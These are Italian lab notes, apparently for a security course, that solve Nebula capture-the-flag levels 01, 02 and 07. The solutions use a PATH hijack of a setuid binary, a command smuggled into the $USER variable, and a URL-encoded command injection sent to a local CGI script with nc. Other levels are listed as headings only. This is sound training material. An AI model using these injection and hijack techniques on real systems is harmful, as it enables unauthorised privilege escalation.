# Esercizi di laboratorio:  


### Nebula 
- lvl 00
- lvl 01:  
    Il comando echo dentro l'eseguibile è eseguito tramite il comando env, che consente di eseguire un comando esterno in un ambiente UNIX.  
    ```bash
    # echo $PATH contiene percorso ricerca UNIX dei binari 
    # si modifica PATH prependendo la directory /tmp
    export PATH=/tmp:$PATH
    echo $PATH # mostra /tmp come prima dir di ricerca

    # Si copia il file /bin/getflag in /tmp/echo 
    cp /bin/getflag /tmp/echo # ora env echo invoca getflag

    cd /home/flag01
    ./flag01 # invoca getflag con i privilegi di getflag!
    ```
- lvl 02:
    Nelle ultime righe del codice sorgente notiamo che viene copiata in un buffer una stringa rappresentante un comando, viene usata la variabile `$USER` come comando, usando export la ridefiniamo con una comand injection: comando_safe + carattere separatore + comando_malizioso + commento. 

    ```bash
    echo $USER # stampa valore corrente ossia: level02
    # si imposta l input malizioso in USER con export 
    export USER="level02; getflag #"
    echo $USER # otteniamo level02; getflag #
    cd /home/flag02
    ./flag02 # esegue getflag con i permessi fi flag02 in quanto il binario ha setuid attivo
    ```
- lvl 03
- lvl 05
- lvl 06
- lvl 07:
    In questa challenge si manomette uno script perl per eseguire getflag con permessi elevati. Nello script perl si prende in input un host ma non si sanifica l'input, si può eseguire una comand injection.  
    comand $\rightarrow$ 8.8.8.8 ; getflag \r\n\r\n (bisogna usare il webserver in ascolto)

    ```bash
    echo -ne "GET /index.cgi?Host=8.8.8.8%3Bgetflag\r\n\r\n" | nc localhost 7007
    ```
    Questo permette di eseguire `getflag` con i permessi di level07.  
    **nota importante**: Bisogna usare l'URL encoding per passare il carattere `;` in quanto tale carattere è speciale e viene consumato dal webserver per separare argomenti della query, si prende quindi il codice ASCII di `;` e lo si  traduce in esadecimeale ossia `3B`, si usa il carattere `%` per attivare l'URL encoding. 
    **nota2:** `\r\n\r\n` indica la fine degli header HTTP, senza il server non capisce che la richiesta è finita e non esegue il comando.    


- lvl 08
- lvl 10 (toctou)

### Protostar 
- stack 01 
- stack 03
- stack 05


### Web4PenTesters
- XSS 1 
- File include 1 
- SQL 1



